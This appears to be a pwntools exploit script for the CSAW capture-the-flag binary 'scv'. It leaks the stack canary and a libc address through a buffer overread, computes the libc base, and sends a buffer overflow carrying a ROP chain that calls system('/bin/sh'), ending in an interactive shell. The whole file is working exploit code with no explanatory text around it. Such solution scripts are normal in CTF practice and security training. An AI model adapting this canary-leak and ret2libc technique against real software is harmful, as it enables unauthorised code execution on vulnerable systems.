# coding: utf-8
from pwn import *
context.arch = 'amd64'
#r = remote('pwn.chal.csaw.io', 3764)
r = process('./scv')
b = ELF('./scv')
#libc = ELF('libc-2.23.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def readMenu():
    return r.recvuntil('>>')

def feed(payload):
    r.sendline('1')
    r.recvuntil('>>')
    r.sendline(payload)
    readMenu()

def review():
    r.sendline('2')
    print r.recvline_contains('PLEASE')
    r.recvline()#dashes
    line = r.recvline()
    line += r.recvline()
    print line
    print readMenu()
    return line

def leakCanary():
    feed('A'*(off-0x8)) #overwrite the null byte in the canary with a newline
    return review()

def leakLibc():
    feed('A'*(off+0x7)) #we use 0x7 because we have to account for the newline char
    return review()

readMenu()
#gdb.attach(r)
off = 0xb0 #buffer offset

#leak libc and canary
canary = u64('\x00' + leakCanary().split('\n')[1][:-3])
print "Canary: {}".format(hex(canary))
libc_start_main_240 = u64(leakLibc().split('\n')[1] + '\x00'*2)
print "Libc start main: {}".format(hex(libc_start_main_240))
libc_base = libc_start_main_240 - 240 - libc.symbols['__libc_start_main']
print "Libc base {}".format(hex(libc_base))

#do bof
libc.address = libc_base
rop = ROP(libc)
rop.system(next(libc.search('/bin/sh\x00')))
payload = 'A'*(off-0x8) + p64(canary) + p64(0xdeadbeef) + str(rop) 
feed(payload)
r.sendline('3')
r.interactive()
